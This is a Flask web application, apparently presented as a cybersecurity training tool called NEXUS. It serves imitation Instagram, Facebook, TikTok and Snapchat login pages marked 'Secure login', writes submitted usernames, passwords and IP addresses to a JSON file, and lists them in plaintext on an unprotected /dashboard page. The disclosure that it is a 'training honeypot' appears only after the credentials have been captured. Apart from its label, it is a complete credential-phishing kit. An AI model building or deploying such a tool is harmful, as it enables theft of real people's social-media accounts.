#!/usr/bin/env python3
from flask import Flask, request
import json
import os
import datetime

app = Flask(__name__)
LOG_FILE = "captures.json"

if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        json.dump([], f)

# Platform data with colors
PLATFORMS = {
    'instagram': {
        'icon': '📸',
        'name': 'Instagram',
        'color': '#E4405F',
        'gradient': 'linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%)',
        'bg': '#fafafa'
    },
    'facebook': {
        'icon': '👍',
        'name': 'Facebook',
        'color': '#1877F2',
        'gradient': 'linear-gradient(135deg, #1877F2 0%, #0d65d9 100%)',
        'bg': '#f0f2f5'
    },
    'tiktok': {
        'icon': '🎵',
        'name': 'TikTok',
        'color': '#000000',
        'gradient': 'linear-gradient(135deg, #000000 0%, #25f4ee 50%, #fe2c55 100%)',
        'bg': '#ffffff'
    },
    'snapchat': {
        'icon': '👻',
        'name': 'Snapchat',
        'color': '#FFFC00',
        'gradient': 'linear-gradient(135deg, #FFFC00 0%, #f5e800 100%)',
        'bg': '#f5f5f5'
    }
}

# Home page - platform grid
HTML_HOME = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 500px; width: 100%; text-align: center; }
        .icon { font-size: 60px; margin-bottom: 10px; }
        h1 { font-size: 36px; font-weight: 700; color: #111; margin-bottom: 6px; }
        .sub { font-size: 16px; color: #666; margin-bottom: 30px; }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin: 20px 0;
        }
        .platform {
            padding: 20px 10px;
            border-radius: 16px;
            border: 1px solid #eee;
            transition: 0.2s;
            text-decoration: none;
            color: #111;
            display: block;
            background: #f5f5f5;
        }
        .platform:active { transform: scale(0.95); }
        .platform .emoji-icon { font-size: 48px; display: block; margin-bottom: 8px; }
        .platform span { display: block; font-weight: 500; font-size: 14px; color: #333; }
        .platform.instagram { background: #fafafa; border-color: #E4405F; }
        .platform.facebook { background: #f0f2f5; border-color: #1877F2; }
        .platform.tiktok { background: #ffffff; border-color: #000000; }
        .platform.snapchat { background: #f5f5f5; border-color: #FFFC00; }
        .footer { margin-top: 30px; font-size: 14px; color: #999; }
        .footer span { color: #111; font-weight: 500; }
        .warning {
            font-size: 14px;
            color: #e74c3c;
            font-weight: 500;
            margin-bottom: 20px;
            background: #fef0ef;
            padding: 10px 14px;
            border-radius: 10px;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🧸</div>
        <h1>NEXUS</h1>
        <p class="sub">Learn cybersecurity by doing</p>
        <div class="warning">⚠️ Training mode — use fake data</div>
        <div class="grid">
            <a href="/login/instagram" class="platform instagram">
                <span class="emoji-icon">📸</span>
                <span>Instagram</span>
            </a>
            <a href="/login/facebook" class="platform facebook">
                <span class="emoji-icon">👍</span>
                <span>Facebook</span>
            </a>
            <a href="/login/tiktok" class="platform tiktok">
                <span class="emoji-icon">🎵</span>
                <span>TikTok</span>
            </a>
            <a href="/login/snapchat" class="platform snapchat">
                <span class="emoji-icon">👻</span>
                <span>Snapchat</span>
            </a>
        </div>
        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
    </div>
</body>
</html>
"""

# Login page template with platform color
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS - {{ platform }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            height: 100%;
            width: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: {{ bg }};
        }
        .container {
            max-width: 400px;
            width: 100%;
            text-align: center;
            background: #ffffff;
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
        }
        .platform-icon { font-size: 60px; margin-bottom: 10px; }
        .platform-header {
            font-size: 24px;
            font-weight: 700;
            color: {{ color }};
            margin-bottom: 4px;
        }
        .platform-badge {
            display: inline-block;
            background: {{ color }}10;
            color: {{ color }};
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 20px;
        }
        .sub { font-size: 15px; color: #666; margin-bottom: 25px; }
        .input-group {
            position: relative;
            margin: 10px 0;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            padding-right: 48px;
            background: #f5f5f5;
            border: 1px solid #ddd;
            border-radius: 12px;
            font-size: 16px;
            color: #111;
            transition: 0.2s;
        }
        .input-group input:focus {
            outline: none;
            border-color: {{ color }};
            background: #fff;
            box-shadow: 0 0 0 3px {{ color }}20;
        }
        .toggle-password {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            padding: 0;
            color: #888;
            line-height: 1;
            opacity: 0.6;
            transition: 0.2s;
        }
        .toggle-password:hover { opacity: 1; }
        .toggle-password:active { transform: translateY(-50%) scale(0.9); }
        button[type="submit"] {
            width: 100%;
            padding: 14px;
            background: {{ color }};
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 15px;
            transition: 0.2s;
        }
        button[type="submit"]:hover {
            opacity: 0.9;
            transform: scale(0.98);
        }
        .footer { margin-top: 25px; font-size: 13px; color: #999; }
        .footer span { color: #111; font-weight: 500; }
        .back {
            display: inline-block;
            margin-top: 15px;
            color: {{ color }};
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
        }
        .back:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="platform-icon">{{ icon }}</div>
        <div class="platform-header">{{ platform }}</div>
        <div class="platform-badge">🔒 Secure login</div>
        <p class="sub">Enter your {{ platform }} credentials</p>
        <form action="/login/{{ platform.lower() }}" method="POST">
            <div class="input-group">
                <input type="text" name="username" placeholder="Username" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder="Password" required>
                <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
            </div>
            <button type="submit">Log In</button>
        </form>
        <a href="/" class="back">← Go back</a>
        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const button = document.querySelector('.toggle-password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                button.textContent = '🙈';
            } else {
                passwordInput.type = 'password';
                button.textContent = '👁️';
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return HTML_HOME

@app.route('/login/<platform>')
def login_page(platform):
    platform = platform.lower()
    if platform not in PLATFORMS:
        return "Platform not found", 404
    data = PLATFORMS[platform]
    html = LOGIN_TEMPLATE.replace('{{ platform }}', data['name'])
    html = html.replace('{{ icon }}', data['icon'])
    html = html.replace('{{ platform.lower() }}', platform)
    html = html.replace('{{ color }}', data['color'])
    html = html.replace('{{ bg }}', data['bg'])
    return html

@app.route('/login/<platform>', methods=['POST'])
def login_post(platform):
    platform = platform.lower()
    if platform not in PLATFORMS:
        return "Platform not found", 404
    
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    
    with open(LOG_FILE, "r") as f:
        logs = json.load(f)
    
    logs.append({
        "timestamp": str(datetime.datetime.now()),
        "platform": PLATFORMS[platform]['name'],
        "username": username,
        "password": password,
        "ip": ip
    })
    
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=4)
    
    return """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            height: 100%;
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container { max-width: 400px; width: 100%; text-align: center; }
        h1 { font-size: 40px; color: #111; margin-bottom: 6px; }
        .icon { font-size: 60px; }
        .msg { font-size: 18px; color: #333; margin: 20px 0; }
        .sub { font-size: 16px; color: #666; }
        a {
            display: inline-block;
            margin-top: 25px;
            color: #007aff;
            text-decoration: none;
            font-size: 18px;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🧸</div>
        <h1>NEXUS</h1>
        <p class="msg">⚠️ This is a training honeypot.</p>
        <p class="sub">Your data has been recorded.</p>
        <a href="/">← Go back</a>
    </div>
</body>
</html>
    """

@app.route('/dashboard')
def dashboard():
    with open(LOG_FILE, "r") as f:
        logs = json.load(f)
    
    html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            max-width: 700px;
            margin: 0 auto;
        }
        h1 { font-size: 32px; color: #111; margin-bottom: 8px; }
        .back { color: #007aff; text-decoration: none; font-size: 16px; }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            font-size: 14px;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 10px 8px;
            text-align: left;
        }
        th { background: #f5f5f5; color: #111; font-weight: 600; }
        tr:nth-child(even) { background: #fafafa; }
        .total { color: #666; margin-top: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <h1>📊 NEXUS Dashboard</h1>
    <p><a href="/" class="back">← Go back</a></p>
    <table>
        <tr><th>Time</th><th>Platform</th><th>Name</th><th>Password</th><th>IP</th></tr>
    """
    
    for log in logs[-20:]:
        html += f"<tr><td>{log['timestamp']}</td><td>{log.get('platform', 'N/A')}</td><td>{log['username']}</td><td>{log['password']}</td><td>{log['ip']}</td></tr>"
    
    html += f"""
    </table>
    <p class="total">Total attempts: {len(logs)}</p>
</body>
</html>
    """
    return html

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
